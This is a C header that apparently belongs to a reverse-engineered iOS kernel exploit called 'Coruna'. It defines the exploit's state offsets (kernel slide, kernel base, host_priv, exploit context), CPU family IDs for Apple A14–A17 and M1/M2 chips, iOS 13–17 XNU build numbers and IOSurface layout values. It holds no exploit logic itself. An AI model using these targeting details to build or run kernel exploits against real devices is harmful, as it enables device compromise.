#ifndef CORUNA_COMMON_H
#define CORUNA_COMMON_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

// Common state structure offsets (0x1D60 bytes total)
#define STATE_FLAGS_00          0x00
#define STATE_KADDR_56          0x56
#define STATE_KERNEL_VERSION    0x140  // 320 decimal
#define STATE_KERNEL_SLIDE      0x158  // 344 decimal
#define STATE_IOSURFACE_CONN    0xE8   // 232 decimal
#define STATE_KOBJ_ADDR         0xF0   // 240 decimal
#define STATE_MAPPED_ADDR       0xF8   // 248 decimal
#define STATE_MAPPED_SIZE       0x100  // 256 decimal
#define STATE_HOST_PRIV         0x1918 // 6424 decimal
#define STATE_FD_BASE           0x1930 // 6448 decimal
#define STATE_KOBJ_PTR          0x19D0 // 6608 decimal
#define STATE_KERNEL_BASE       0x19E0 // 6624 decimal
#define STATE_EXPLOIT_CTX       0x1D40 // 7488 decimal

// Capability flags
#define CAP_A16_EVEREST         0x1000000
#define CAP_A15_BLIZZARD        0x80000
#define CAP_A17_PRO             0x4000000
#define CAP_A14_LIGHTNING       0x2000
#define CAP_M1_M2               0x100000
#define CAP_NEWER_VARIANT       0x80000
#define CAP_OLDER_VARIANT       0x1

// CPU family constants
#define CPU_A16_EVEREST         0x87212A4A  // -2023363094
#define CPU_A15_BLIZZARD        0x1B588BB3  // 458787763
#define CPU_A17_PRO             0x28765C14  // 678884788
#define CPU_A14_LIGHTNING       0x92FB7508  // -1829029944
#define CPU_M1_M2               0xDA33D83D  // -634136515
#define CPU_NEWER_VARIANT       0x573B5EEC  // 1463508716
#define CPU_OLDER_VARIANT       0x07D34B9F  // 131287967

// XNU build numbers
#define XNU_IOS13               6153
#define XNU_IOS14               7195
#define XNU_IOS15_0             8019
#define XNU_IOS15_1             8020
#define XNU_IOS16_0             8792
#define XNU_IOS16_1             8796
#define XNU_IOS17               10002

// Kernel address thresholds
#define KADDR_THRESHOLD_1       0x1C1B1914600000ULL
#define KADDR_THRESHOLD_2       0x225C1E804FFFFFULL
#define KADDR_THRESHOLD_3       0x1F543C41E00000ULL
#define KADDR_THRESHOLD_4       0x1F530F02800000ULL
#define KADDR_THRESHOLD_5       0x2258000000000000ULL
#define KADDR_THRESHOLD_6       0x1C1B0A80100000ULL
#define KADDR_THRESHOLD_7       0x1F530000000000ULL
#define KADDR_THRESHOLD_8       0x1F530F027FFFFFULL
#define KADDR_THRESHOLD_9       0x2257FFFFFFFFFFULL

// IOSurface stride by XNU version
static inline uint32_t iosurface_stride_for_xnu(uint32_t xnu_major) {
    switch (xnu_major) {
        case 7195: return 280;
        case 8019: return 296;
        case 8020: return 160;
        case 8792:
        case 8796: return 192;
        case 10002: return 208;
        default: return 280;
    }
}

// Forward declarations for cross-module functions
extern int sub_9dc8(void *state, uint64_t arg2, uint64_t arg3, void **out_ptr);
extern int sub_13c5c(void *state, uint64_t arg2, uint64_t arg3, void **out_ptr);
extern int sub_1393c(void *state, uint64_t arg2, uint64_t arg3, void **out_ptr);
extern int sub_8a48(void *state);
extern int sub_72ec(void *state);
extern int sub_e418(void *state);
extern int sub_b8f8(void *state);

#endif // CORUNA_COMMON_H
